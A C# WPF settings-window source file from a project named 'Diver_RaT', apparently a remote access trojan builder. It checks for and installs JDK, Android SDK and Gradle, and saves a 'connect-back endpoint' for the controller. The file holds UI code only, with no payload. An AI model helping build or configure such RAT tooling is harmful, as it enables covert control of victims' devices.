using System.Globalization;
using System.Windows;
using System.Windows.Media;

namespace Diver_RaT
{
    public partial class SettingsWindow : Window
    {
        private bool _closed;

        public SettingsWindow()
        {
            InitializeComponent();
            Loaded += OnLoaded;
            Closed += OnClosed;
        }

        private void OnLoaded(object sender, RoutedEventArgs e)
        {
            IpTextBox.Text = ControllerSettings.Ip;
            PortTextBox.Text = ControllerSettings.Port.ToString(CultureInfo.InvariantCulture);

            SetupOrchestrator.ProgressChanged += OnProgress;
            SetupOrchestrator.Completed += OnCompleted;
            _closed = false;

            RefreshStatus();
            ApplyOrchestratorState();

            foreach (var line in SetupOrchestrator.GetLogSnapshot())
                LogBox.AppendText(line + Environment.NewLine);
            LogBox.ScrollToEnd();

            var latest = SetupOrchestrator.Latest;
            if (latest.Percent >= 0)
            {
                ProgressBar.IsIndeterminate = false;
                ProgressBar.Value = latest.Percent;
            }
            if (!string.IsNullOrEmpty(latest.Message))
                ProgressText.Text = latest.Message;
        }

        private void OnClosed(object? sender, System.EventArgs e)
        {
            _closed = true;
            SetupOrchestrator.ProgressChanged -= OnProgress;
            SetupOrchestrator.Completed -= OnCompleted;
            TrySaveEndpoint(showError: false);
        }

        private void OnProgress(ProgressInfo info)
        {
            if (_closed) return;
            if (info.Percent >= 0)
            {
                ProgressBar.IsIndeterminate = false;
                ProgressBar.Value = info.Percent;
                ProgressText.Text = $"{info.Message}  ({info.Percent:0}%)";
            }
            else
            {
                ProgressText.Text = info.Message;
            }
            LogLine(info.Message);
            ApplyOrchestratorState();
        }

        private void OnCompleted(bool ok, string msg)
        {
            if (_closed) return;
            ProgressBar.IsIndeterminate = false;
            ProgressBar.Value = 100;
            RefreshStatus();
            ApplyOrchestratorState();
            LogLine(ok ? "Done." : msg);
        }

        private void ApplyOrchestratorState()
        {
            bool busy = SetupOrchestrator.IsBusy;
            InstallAllButton.IsEnabled = !busy;
            JdkButton.IsEnabled = !busy;
            SdkButton.IsEnabled = !busy;
            GradleButton.IsEnabled = !busy;
            CancelButton.IsEnabled = busy;
        }

        private void RefreshStatus()
        {
            ToolsPathText.Text = BuildEnvironment.ToolsDir;

            var jdk = BuildEnvironment.CheckJdk();
            JdkDot.Background = jdk.Found ? Brushes.LimeGreen : (Brush)FindResource("DangerBrush");
            JdkStatusText.Text = jdk.Label;
            JdkPathText.Text = jdk.Path;
            JdkButton.Content = jdk.Found ? "Reinstall" : "Download";

            var sdk = BuildEnvironment.CheckAndroidSdk();
            SdkDot.Background = sdk.Found ? Brushes.LimeGreen : (Brush)FindResource("DangerBrush");
            SdkStatusText.Text = sdk.Label;
            SdkPathText.Text = sdk.Path;
            SdkButton.Content = sdk.Found ? "Reinstall" : "Download";

            var gradle = BuildEnvironment.CheckGradle();
            GradleDot.Background = gradle.Found ? Brushes.LimeGreen : (Brush)FindResource("DangerBrush");
            GradleStatusText.Text = gradle.Label;
            GradlePathText.Text = gradle.Path;
            GradleButton.Content = gradle.Found ? "Reinstall" : "Download";
        }

        private void LogLine(string line)
        {
            if (string.IsNullOrEmpty(line)) return;
            if (line.StartsWith("Downloading") || line.StartsWith("  sdk:")) return;
            LogBox.AppendText(line + Environment.NewLine);
            LogBox.ScrollToEnd();
        }

        private void CloseButton_Click(object sender, RoutedEventArgs e) => Close();

        private void CancelButton_Click(object sender, RoutedEventArgs e) => SetupOrchestrator.Cancel();

        private void InstallAllButton_Click(object sender, RoutedEventArgs e)
            => SetupOrchestrator.Start(SetupOrchestrator.Target.All);

        private void JdkButton_Click(object sender, RoutedEventArgs e)
            => SetupOrchestrator.Start(SetupOrchestrator.Target.Jdk);

        private void SdkButton_Click(object sender, RoutedEventArgs e)
            => SetupOrchestrator.Start(SetupOrchestrator.Target.Sdk);

        private void GradleButton_Click(object sender, RoutedEventArgs e)
            => SetupOrchestrator.Start(SetupOrchestrator.Target.Gradle);

        private void SaveEndpointButton_Click(object sender, RoutedEventArgs e)
        {
            if (TrySaveEndpoint(showError: true))
                ProgressText.Text = "Saved connect-back endpoint: " + IpTextBox.Text.Trim() + ":" + PortTextBox.Text.Trim();
        }

        private bool TrySaveEndpoint(bool showError)
        {
            try
            {
                var ip = IpTextBox.Text.Trim();
                var portText = PortTextBox.Text.Trim();
                if (string.IsNullOrWhiteSpace(ip))
                {
                    if (showError) ProgressText.Text = "Enter the controller IP or hostname.";
                    return false;
                }
                if (!int.TryParse(portText, NumberStyles.Integer, CultureInfo.InvariantCulture, out int port) || port is < 1 or > 65535)
                {
                    if (showError) ProgressText.Text = "Port must be between 1 and 65535.";
                    return false;
                }
                ControllerSettings.Save(ip, port);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}